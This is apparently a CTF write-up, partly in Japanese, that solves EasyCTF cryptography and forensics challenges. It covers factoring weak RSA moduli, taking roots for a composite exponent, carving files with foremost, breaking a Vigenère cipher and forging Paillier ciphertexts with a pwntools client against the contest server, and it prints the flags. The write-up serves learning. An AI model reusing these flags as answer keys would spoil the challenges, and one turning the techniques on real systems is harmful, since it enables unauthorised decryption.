`easyctf{d33p_zo0m_HeKker_2c1ae5}`

### RSA 3

``` python
#!/usr/bin/env python3
n = 0x27335d21ca51432fa000ddf9e81f630314a0ef2e35d81a839584c5a7356b94934630ebfc2ef9c55b111e8c373f2db66ca3be0c0818b1d4eda7d53c1bd0067f66a12897099b5e322d85a8da45b72b828813af23
e = 0x10001
c = 0x9b9c138e0d473b6e6cf44acfa3becb358b91d0ba9bfb37bf11effcebf9e0fe4a86439e8217819c273ea5c1c5acfd70147533aa550aa70f2e07cc98be1a1b0ea36c0738d1c994c50b1bd633e3873fc0cb377e7

# http://factordb.com/
p = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869
q = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871
assert n == p * q

# decode
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
import gmpy2
d = int(gmpy2.invert(e, (p-1)*(q-1)))
key = RSA.construct([ n, e, d ])
m = key.decrypt(c)
print(long_to_bytes(m).decode())
```

`easyctf{tw0_v3ry_merrry_tw1n_pr1m35!!_417c0d}`

### RSA 4

``` python
#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes
import gmpy2
p = 13013195056445077675245767987987229724588379930923318266833492046660374216223334270611792324721132438307229159984813414250922197169316235737830919431103659
q = 12930920340230371085700418586571062330546634389230084495106445639925420450591673769061692508272948388121114376587634872733055494744188467315949429674451947
e = 100
c = 2536072596735405513004321180336671392201446145691544525658443473848104743281278364580324721238865873217702884067306856569406059869172045956521348858084998514527555980415205217073019437355422966248344183944699168548887273804385919216488597207667402462509907219285121314528666853710860436030055903562805252516
n = p * q
e1 = 4
e2 = 25
assert e == e1 * e2
d2 = int(gmpy2.invert(e2, (p-1)*(q-1)))
m2 = pow(c, d2, n)
m1 = int(gmpy2.isqrt(m2))
m  = int(gmpy2.isqrt(m1))
print(long_to_bytes(m).decode())
```

`easyctf{m0dul4r_fuN!}`

### My USB

```
$ foremost 2c370b79d147127064f019dcb05bba1aa917c552_usb.img
$ open output/jpg/00002494.jpg
```

`flag{d3let3d_f1l3z_r_k00l}`

### Let Me Be Frank

推測によるvigenere cipher解読する

-   key: `lsnwallpw`
-   plaintext: `you should be happy, i put some extra words here to make this easier to solve. easyctf{better_thank_the_french_for_this_one}`

### Paillier Service

Paillier暗号の準同型性やるだけ。それでも比較するとまともな問題だった。

flag: `44073117240618665780675193850837939995438219250244678211539041436428154743261238082817577099306521708734123381615432054274681465095612422847370622010652215512660940106734460138798004151939831278940754163448609294265458598883535128433424615303280599380544523443593952238464672302887846705279608801286723167548136016323776193330983364067235836166569465230366`

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
import functools
import operator
from Crypto.Util.number import bytes_to_long
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='paillier.tcp.easyctf.com')
parser.add_argument('port', nargs='?', default=8570, type=int)
parser.add_argument('--log-level', default='debug')
args = parser.parse_args()
context.log_level = args.log_level

def encrypt(m, r):
    '''
    c = (1 + n)**m * r**n % n**2
    '''
    with remote(args.host, args.port) as p:
        p.recvuntil('Enter a message to encrypt (int): ')
        p.sendline(str(m))
        p.recvuntil('Enter r (int): ')
        p.sendline(str(r))
        p.recvuntil('c: ')
        return int(p.recvall())

e = encrypt(1, 1)
n = e - 1
m = bytes_to_long('easyctf{3ncrypt_m3!}')
c = pow(e, m, n**2)
print(c)
```
